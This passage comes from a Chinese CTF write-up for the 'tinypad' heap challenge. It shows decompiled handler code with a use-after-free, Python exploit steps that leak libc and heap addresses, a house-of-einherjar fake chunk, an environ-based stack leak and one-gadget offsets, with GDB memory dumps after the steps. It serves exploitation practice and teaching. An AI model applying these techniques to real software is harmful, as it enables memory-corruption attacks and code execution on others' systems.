class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">240</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>LABEL_31<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not used\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">248</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">240</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 比较有意思，只是置空了 size 大小</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  \t\t\t\t\t\t\t\t\t\t\t\t  <span class=\"token comment\">// 指针未置空，存在 UAF 漏洞</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nDeleted.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>Edi 片段</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">!=</span> <span class=\"token char\">'E'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">==</span> <span class=\"token char\">'Q'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>          <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>LABEL_41<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No such a command\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11LL</span><span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      count <span class=\"token operator\">=</span> <span class=\"token function\">read_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> count <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> count <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_29<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">240</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_31<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      c <span class=\"token operator\">=</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>tinypad<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">248</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">toupper</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'Y'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CONTENT: \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9LL</span><span class=\"token punctuation\">,</span> v16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        v12 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>tinypad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span>tinypad<span class=\"token punctuation\">,</span> v12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13LL</span><span class=\"token punctuation\">,</span> v13<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        v14 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">248</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 返回之前 Add 的数据长度</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">read_until</span><span class=\"token punctuation\">(</span>tinypad<span class=\"token punctuation\">,</span> v14<span class=\"token punctuation\">,</span> <span class=\"token number\">10LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 以之前数据长度去进行输入</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Is it OK?\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(Y/n)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9LL</span><span class=\"token punctuation\">,</span> v15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">read_until</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">,</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">248</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> tinypad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nEdited.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>分析完代码之后，想象一下如何泄露 libc_addr 和 heap_addr。可以挂一个 unsortedbin 和两个 fastbin 去写了</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(SIZE)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Del</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'D'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Edi</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CMD)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'E'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"(Y/n)>>> \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Y'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>泄露 libc 和 heap</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 1\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>unsortedbin_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'unsortedbin_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc_base <span class=\"token operator\">=</span> unsortedbin_addr <span class=\"token operator\">-</span> <span class=\"token number\">88</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3C4B20</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 2\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>heap_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>heap_base <span class=\"token operator\">=</span> heap_addr <span class=\"token operator\">-</span> <span class=\"token number\">0xe0</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heap_base'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Del<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>接下来进行 <code>house-of-einherjar</code>  环节</p>\n<p>因为这个题的 Edi 写入的缘故，利用方法 1 还是比较难以操作，可以成方法 1 为三明治攻击</p>\n<p>所以我们利用 offset，去申请非 heap 区的区域，此题最合适的可以去利用 <code>tinypad</code> ，去伪造 chunk。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#chunk1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#chunk2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#chunk3</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'd'</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#chunk4</span></pre></td></tr></table></figure><p>申请四个 chunk，利用前两个 chunk 进行 <code>house-of-einherjar</code>  流程</p>\n<p>由 Edi 的原因，在将 chunk2 的 p 位去置 0 需要进行循环写入操作</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>tinypad <span class=\"token operator\">=</span> <span class=\"token number\">0x602040</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>offset <span class=\"token operator\">=</span> heap_base <span class=\"token operator\">-</span> tinypad</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Edi<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">,</span><span class=\"token string\">b'f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code class=\"language-ASN.1\">0x603000\t0x0000000000000000\t0x0000000000000021\t........!.......----&gt;chunk1\n0x603010\t0x6262626262626262\t0x6262626262626262\tbbbbbbbbbbbbbbbb\n0x603020\t0x0000000000000fc0\t0x0000000000000100\t................----&gt;chunk2\n0x603030\t0x6262626262626262\t0x6262626262626262\tbbbbbbbbbbbbbbbb\n</code></pre>\n<p>接下来我们去 free 掉 chunk，就可以通过 <code>chunk_addr - presize</code>  定位到下一个 free_chunk (fake_chunk)</p>\n<p>所以我们可以通过 Edi 操作，进行伪造 chunk</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl1 <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>tinypad<span class=\"token operator\">+</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Edi<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pl1<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code class=\"language-ASN.1\">0x602060 &lt;tinypad+32&gt;:\t0x0000000000000000\t0x0000000000000101----&gt;fake_chunk\n0x602070 &lt;tinypad+48&gt;:\t0x0000000000602060\t0x0000000000602060\n0x602080 &lt;tinypad+64&gt;:\t0x6262626262626200\t0x6262626262626262\n0x602090 &lt;tinypad+80&gt;:\t0x6262626262626262\t0x6262626262626262\n0x6020a0 &lt;tinypad+96&gt;:\t0x6262626262626262\t0x6262626262626262\n</code></pre>\n<p>接下来 free chunk2，绕过 unlink 检测</p>\n<blockquote>\n<p>Del(2)</p>\n<p>0x602060 &lt;tinypad+32&gt;:\t0x0000000000000000\t0x00000000000010c1<br>\n0x602070 &lt;tinypad+48&gt;:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78------&gt; 改成正常地址可分配<br>\n 0x602080 &lt;tinypad+64&gt;:\t0x0000000000000000\t0x0000000000000000</p>\n<p>pl2 = b’b’*0x20 + p64(0) + p64(0x101) + p64(tinypad+0x30) + p64(tinypad+0x30)<br>\nEdi(3,pl2)</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>env <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>pl3 <span class=\"token operator\">=</span> <span class=\"token string\">b'c'</span><span class=\"token operator\">*</span><span class=\"token number\">0xd0</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x602148</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span>pl3<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在 tinypad 去进行任意读写 chunk</p>\n<blockquote>\n<p>0x602140 &lt;tinypad+256&gt;:\t0x0000000000000018\t0x00007ffff7bc6f38 chunk1<br>\n0x602150 &lt;tinypad+272&gt;:\t0x00000000000000f0\t0x0000000000602148 chunk2<br>\n0x602160 &lt;tinypad+288&gt;:\t0x0000000000000100\t0x0000000000603131 chunk3<br>\n0x602170 &lt;tinypad+304&gt;:\t0x0000000000000100\t0x0000000000603240 chunk4</p>\n</blockquote>\n<p>chunk1 可以直接读 stack 地址，chunk2 可以指向 chunk1 位置，此时可以将 chunk1 当前的 env 改写成 ret 地址</p>\n<blockquote>\n<p>chunk2 结构</p>\n<p>0x602138 &lt;tinypad+248&gt;:\t0x6363636363636363\t0x0000000000000018<br>\n0x602148 &lt;tinypad+264&gt;:\t0x00007ffff7bc6f38\t0x00000000000000f0<br>\n0x602158 &lt;tinypad+280&gt;:\t0x0000000000602148\t0x0000000000000100<br>\n0x602168 &lt;tinypad+296&gt;:\t0x0000000000603131\t0x0000000000000100<br>\n0x602178 &lt;tinypad+312&gt;:\t0x0000000000603240\t0x0000000000000000</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xf03a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4527a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1247</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>og <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"#   INDEX: 1\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"# CONTENT: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span 